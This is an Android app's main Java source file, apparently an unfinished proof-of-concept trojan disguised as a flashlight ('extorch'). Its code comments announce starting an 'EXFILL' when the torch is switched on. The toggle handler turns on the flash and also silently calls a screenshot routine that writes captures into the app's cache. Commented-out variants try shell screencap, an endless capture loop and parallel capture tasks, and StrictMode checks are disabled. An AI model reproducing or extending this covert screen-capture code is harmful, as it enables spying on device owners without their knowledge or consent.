package com.mlw.extorch;

import androidx.appcompat.app.AppCompatActivity;
import androidx.constraintlayout.solver.widgets.Rectangle;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Camera;
import android.graphics.Canvas;
import android.graphics.Matrix;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.StrictMode;
import android.util.DisplayMetrics;
import android.view.Display;
import android.view.View;
import android.view.WindowManager;
import android.widget.CompoundButton;
import android.widget.Switch;
import android.widget.Toast;
import com.mlw.extorch.ScreentShotUtil;

import java.io.OutputStream;
import java.util.concurrent.ForkJoinPool;
import java.util.concurrent.TimeUnit;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.NotDirectoryException;
import java.util.Date;
import com.mlw.extorch.CacheScreenShoot;

public class MainActivity extends AppCompatActivity {

    Switch flashControl;
    CameraManager cameraManager;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // work around for uri exposed
        StrictMode.VmPolicy.Builder builder = new StrictMode.VmPolicy.Builder();
        StrictMode.setVmPolicy(builder.build());

        //workaround for hidden API's

        flashControl = findViewById(R.id.flashSwitch);
        cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);

        //WE NEED TO CHECK IF THE DEVICE HAS A CAMERA (OR FLASH)
        if(getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA_ANY)){
            if(getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA_FLASH)){
                //HERE WE TURN THE FLASH ON AND START THE EXFILL
                flashControl.setEnabled(true);
                //pararrel screenshoot execution
//                execute_captures();
            }else{
                Toast.makeText(MainActivity.this, "This device has no flash!", Toast.LENGTH_SHORT).show();
            }
        }else{
            Toast.makeText(MainActivity.this, "This device has no camera!", Toast.LENGTH_SHORT).show();
        }

        flashControl.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if(isChecked){
                    //user turned on thew flashlight, the default rear camera has 0 as id
                    try {
                        cameraManager.setTorchMode("0", true);
                    } catch (CameraAccessException e) {
                        e.printStackTrace();
                    }
                    try {
                        execute_captures();
                    } catch (IOException | InterruptedException e) {
                        e.printStackTrace();
                    }
                    flashControl.setText("Flash OFF");
                }else{
                    try {
                        cameraManager.setTorchMode("0", false);
                    } catch (CameraAccessException e) {
                        e.printStackTrace();
                    }
                    flashControl.setText("Flash ON");
                }
            }
        });

    }

    private void execute_captures() throws IOException, InterruptedException {
//        final ForkJoinPool pool = ForkJoinPool.commonPool();
        Date date = new Date();
        CharSequence now = android.text.format.DateFormat.format("yyyy-MM-dd_hh:mm:ss", date);
        //create file directory in cache app dir
        File temp_dir = new File(getCacheDir(), "scrn");
        temp_dir.mkdir();
        String scrn_name = getCacheDir() + "/scrn/" + now + ".jpg";
        ScreentShotUtil.getInstance().takeScreenshot(this, "");

//        ProcessBuilder pb = new ProcessBuilder("/system/bin/screencap", "-p", scrn_name);
//        Process p = pb.start();

//        Process sh = Runtime.getRuntime().exec("/system/bin/sh", null,null);
//        OutputStream os = sh.getOutputStream();
//        os.write(("/system/bin/screencap -p " + scrn_name).getBytes("ASCII"));
//        os.flush();
//        os.close();
//        sh.waitFor();


//        while(true){
//            cache_screenshoot();
//        }


//        // execute 10 tasks
//        for (int i = 0; i < 10; i++) {
//            pool.execute(new CacheScreenShoot(this));
//        }
//
//        pool.awaitQuiescence(3, TimeUnit.SECONDS);
    }

    private void cache_screenshoot(){
        Date date = new Date();
        CharSequence now = android.text.format.DateFormat.format("yyyy-MM-dd_hh:mm:ss", date);
        //create file directory in cache app dir
        File temp_dir = new File(getCacheDir(), "scrn");
        temp_dir.mkdir();

        String scrn_name = getCacheDir() + "/scrn/" + now + ".jpg";

        View root = getWindow().getDecorView();
        root.setDrawingCacheEnabled(true);
        Bitmap bitmap = Bitmap.createBitmap(root.getDrawingCache());
        root.setDrawingCacheEnabled(false);

        File scrn = new File(scrn_name);
        try {
            scrn.createNewFile();
        }catch (IOException e){
            e.printStackTrace();
        }

        try {
            FileOutputStream fileOutputStream = new FileOutputStream(scrn);
            bitmap.compress(Bitmap.CompressFormat.JPEG, 100, fileOutputStream);
            fileOutputStream.flush();
            fileOutputStream.close();
            // image show not needed, but no working anyway :(
//            Uri uri = Uri.fromFile(scrn);
//            Intent intent = new Intent(Intent.ACTION_VIEW);
//            intent.setDataAndType(uri, "image/*");
//            startActivity(intent);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

}